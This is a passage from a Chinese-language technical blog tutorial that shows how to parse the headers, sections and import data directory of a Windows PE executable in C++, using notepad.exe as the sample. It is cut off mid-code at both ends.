class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="string">&quot;notepad.exe&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::ifstream <span class="title function_">inputFile</span><span class="params">(filePath, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::binary)</span>;</span><br><span class="line"><span class="keyword">if</span> (!inputFile.is_open()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;cant open: &quot;</span> &lt;&lt; filePath &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">ostringstream</span> peFileString;</span><br><span class="line">peFileString &lt;&lt; inputFile.rdbuf();</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> fileContent = peFileString.str();</span><br><span class="line">inputFile.close();</span><br><span class="line"></span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = \</span><br><span class="line">    (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::hex;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;PE e_magic  : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;PE e_lfanew : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="如何判断程序位数找到代码段等"><a class="markdownIt-Anchor" href="#如何判断程序位数找到代码段等"></a> 如何判断程序位数,找到代码段等</h2><p>上面说到我们通过<code>e_lfanew</code>找到了<code>NT Header</code>，这里我们先假设他是一个64位程序的PE文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">//标签，说明这是NT头</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;<span class="comment">//文件头,重要</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;<span class="comment">//可选项头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>这里主要功能是通过<code>FileHeader</code>来实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><h3 id="判断程序位数-nt头"><a class="markdownIt-Anchor" href="#判断程序位数-nt头"></a> 判断程序位数-NT头</h3><p>首先，使用<code>IMAGE_FILE_HEADER.Machine</code>可以很轻松的判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS64* ntTempHeader = \</span><br><span class="line">    (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]);</span><br><span class="line"><span class="built_in">SetConsoleOutputCP</span>(CP_UTF8);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;程序位数    : &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x8664</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;64位\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x014c</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;32位\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103100814694.png" alt="image-20250103100814694" /></p><p>更多架构的类型说明在：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#machine-types">https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#machine-types</a></p><h3 id="解析代码段-段头部"><a class="markdownIt-Anchor" href="#解析代码段-段头部"></a> 解析代码段-段头部</h3><p>这里由于已知是64位程序继续按照64位的讲下去</p><ol><li>使用<code>IMAGE_FILE_HEADER.NumberOfSections</code>获得区段数量</li><li>找到各个<code>section</code>的位置，计算公式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>N</mi><mi>T</mi><mi mathvariant="normal">_</mi><mi>H</mi><mi>E</mi><mi>A</mi><mi>D</mi><mi>E</mi><mi>R</mi><mo>+</mo><mi>n</mi><mi>t</mi><mi>H</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>+</mo><mi>i</mi><mo>∗</mo><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>H</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">section[i]=NT\_HEADER+ntHeadSize+i*sectionHeadSize</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span></span></span></span></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; </span><br><span class="line">        nt_head_file_start \</span><br><span class="line">        + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS64) \</span><br><span class="line">        + i * <span class="title function_">sizeof</span><span class="params">(IMAGE_SECTION_HEADER)</span> </span><br><span class="line">        &lt;&lt; &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103101928624.png" alt="image-20250103101928624" /></p><p>再对每个<code>IMAGE_SECTION_HEADER</code>进行解析就能得到相关信息</p><p>那么关于<code>IMAGE_SECTION_HEADER</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>这里来到第一个难点：<code>VirtualAddress</code>，简称 <strong>VA</strong>，这里用<code>.text</code>段也即第一个section来探索</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 sectionFileAddr = \</span><br><span class="line">        nt_head_file_start \</span><br><span class="line">        + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) \</span><br><span class="line">        + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    </span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader = \</span><br><span class="line">        (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; \</span><br><span class="line">        sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;   Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] name : &quot;</span> &lt;&lt; \</span><br><span class="line">        sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;   Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] VA   : &quot;</span> &lt;&lt; \</span><br><span class="line">        sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103104342974.png" alt="image-20250103104342974" /></p><p>在CFF Explorer中，这些区段的低位和我们解析的地址是相同的，说明：<strong>VA是程序运行后，相对于rebase的偏移</strong>，在微软的文档中是这样说明的：</p><blockquote><p>加载到内存中的节的第一个字节的地址，相对于映像基。 对于对象文件，这是应用重定位之前第一个字节的地址。</p></blockquote><p>同样的<code>VirtualSize</code>选项可以得到改区段的大小，从而得到区段结束位置</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Misc.VirtualSize</span><br></pre></td></tr></table></figure><p>加载到内存中的节的总大小（以字节为单位）。 如果此值大于 <strong>SizeOfRawData</strong> 成员，则节将填充零。 此字段仅对可执行映像有效，对于对象文件，应设置为 0。</p></blockquote><p>利用在<code>IMAGE_SECTION_HEADER</code>中有一个<code>PointerToRawData</code>可以找到相关数据在文件中的位置，</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>A</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>P</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">FileAddr=section.PointerToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">o</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span>，就是直接从文件最开始相加就得到位置了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            name        : &quot;</span> &lt;&lt; sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            VA          : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            ptr2RawData : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103113642421.png" alt="image-20250103113642421" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151302092.png" alt="image-20250103113625530" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151309430.png" alt="image-20250103113815257" /></p><h2 id="如何找到导入的函数和dll-导入表"><a class="markdownIt-Anchor" href="#如何找到导入的函数和dll-导入表"></a> 如何找到导入的函数和DLL-导入表</h2><p>在编程中会使用到其他dll文件的函数，例如<code>kernel.dll</code>、<code>CRuntimeLib.dll</code>，PE文件通过一个导入目录（<strong>IAT</strong>）进行索引</p><p>在编写程序时，我们往往需要在程序中内置部分资源，甚至在上述的section遍历中我们也发现了许多的section，每一个不同的section都会存储不同类型的数据，比如</p><ul><li>代码段：包含可执行的程序代码。</li><li>数据段：包含初始化数据。</li><li>导入表：指定外部符号，告诉操作系统需要哪些外部函数。</li><li>导出表：列出了程序导出的函数，供其他程序调用。</li><li>资源表：包含程序使用的各种资源，如图标、对话框、字符串等。</li></ul><p>回到一开始 NT头的<code>OptionalHeader</code>部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><ul><li><code>AddressOfEntryPoint</code>：指向入口点函数（相对于图像基址）的指针</li><li><code>DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</code>：指向数据目录中第一 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-image_data_directory">个IMAGE_DATA_DIRECTORY</a> 结构的指针</li></ul><p><code>DataDirectory</code> 存储了这些不同区域在文件中的位置和大小，因此它是一个“目录”或“索引”，指示每个数据段的位置。关于具体类型在该数组下的取值可以参考：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_optional_header32">https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_optional_header32</a></p><p>具体的<code>IMAGE_DATA_DIRECTORY</code>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>选择几个查看一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="string">&quot;---OptionalHeader.DataDirectories\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;基本重定位表           : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;全局指针的相对虚拟地址   : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;导入地址表             : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151315999.png" alt="image-20250103111009787" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151319181.png" alt="image-20250103120523637" /></p><p>**注意：**这里的<code>IMAGE_DIRECTORY_ENTRY_IAT</code>和<code>IMAGE_DIRECTORY_ENTRY_IMPORT</code>是两个东西</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151323839.png" alt="image-20250103125031177" /></p><p><strong>后续使用的是<code>IMAGE_DIRECTORY_ENTRY_IMPORT</code></strong></p><p>貌似依然是在内存中的虚拟地址，我们姑且将其称为<code>DVA</code>（datadirectory virtual adresss）。</p><p>那么如何通过<code>IMAGE_OPTIONAL_HEADER64</code>找到IAT呢？首先<code>IAT</code>的相关信息是一定存在文件中的，就不可避免地要计算偏移，将这个偏移设置为<code>RVA</code></p><p>结合<code>IMAGE_SECTION_HEADER</code>中有一个<code>PointerToRawData</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>V</mi><mi>A</mi><mo>=</mo><mi>D</mi><mi>V</mi><mi>A</mi><mo>−</mo><mi>V</mi><mi>A</mi><mo>+</mo><mi>P</mi><mi>t</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">RVA=DVA-VA+PtrToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span></p><p>这里以导入地址表为例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">DWORD64 iatRVA = <span class="number">0</span>;</span><br><span class="line">DWORD64 sectionFileAddr;</span><br><span class="line">IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">    iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span 